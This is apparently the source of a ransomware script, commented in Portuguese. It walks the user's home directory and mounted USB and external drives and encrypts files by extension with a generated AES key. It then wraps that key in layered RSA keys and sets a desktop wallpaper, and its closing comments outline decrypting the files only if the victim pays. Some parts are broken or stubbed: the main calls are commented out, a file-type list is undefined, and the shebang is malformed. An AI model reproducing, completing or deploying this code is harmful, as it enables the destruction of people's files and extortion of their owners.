#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho

import os
import socket
from random import choice
import getpass
import sys
import shutil

from AES import *
from RSA import *
from SRSA import *


# ponto de partida da criptografia

def menu(senha_AES):
    # caminho de partida
    home = os.environ['HOME']
    listar(senha_AES,home,tipos_arquivos)
    listar_media(senha_AES,tipos_arquivos)

# função que lista e criptografa HD'S externos e pendrives
def listar_media(senha_AES, tipos_arq):
    print('Procurando por pendrives/HDs')
    caminho = '/media/'+getpass.getuser()
    if(os.path.isdir(caminho)):
        listar(senha_AES,caminho,tipos_arq)


# função que lista todos os arquivos e criptografa ou descriptografa
def listar(chave_AES,diretorio, tipos_arq):
    atual = os.getcwd()
    for caminho, diretorio, arquivo in os.walk(diretorio):
        for arq in arquivo:
            a = caminho+'/'+arq
            extensao = os.path.splitext(a)
            for ext in tipos_arq:
                if(extensao[1] == ext):
                    if(caminho == atual):
                        ignorar = 1
                    else:
                        a = a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
                        try:
                            criptografa(chave_AES,a)
                        except:
                            print('erro ao criptografar-> ' +str(a))




# GERA SENHA AES que vai criptografar os arquivos
def gera_chave_AES():
    caminho = os.environ['HOME']+'/Desktop/'
    caminho2 = os.environ['HOME']+'/Área\ de\ Trabalho/'
    if(os.path.isdir(caminho)):
        caminho_correto = caminho
    elif(os.path.isdir(caminho2)):
        caminho_correto = caminho2
        
    tamanho = 256 # bytes
    caracters = '0123456789abcdefghijlmnopqrstuwvxz-/*&#@!=-.,'
    senha = ''
    for char in xrange(tamanho):
        senha += choice(caracters)

    with open(caminho_correto + 'AES.txt','w') as f:
        f.write(senha)
    return senha

# função que troca o plano de fundo do compiuter
def change_background():
    os.system('gsettings set org.gnome.desktop.background picture-uri '+ os.getcwd()+'/wallpaper.jpg')

# função que criptografa tudo
def crypto_all():
    AES_key = gera_chave_AES()
    print('[*] Chave AES gerada')
    #menu(AES_key) # -> criptografa tudo
    AES_to_RSA()
    print('[*] Senha AES criptografado com chave RSA')
    RSA_to_SRSA()
    print('[*] Chave privada do cliente criptografada')


# MAIN
if __name__ == "__main__":
    #crypto_all()
    #change_background()
    pass







# == ALGORITMO ==
    # criptografa todos os arquivos com AES

    # criptografa a chave AES

    # criptografa a chave privada RSA


    ############### SE PAGAR #####################


    # descriptografa a chave privada (R) com a chave privada(S)

    # descriptografa a chave AES, com a chave privada (R)

    # descriptografa todos os arquivos com a chave AES
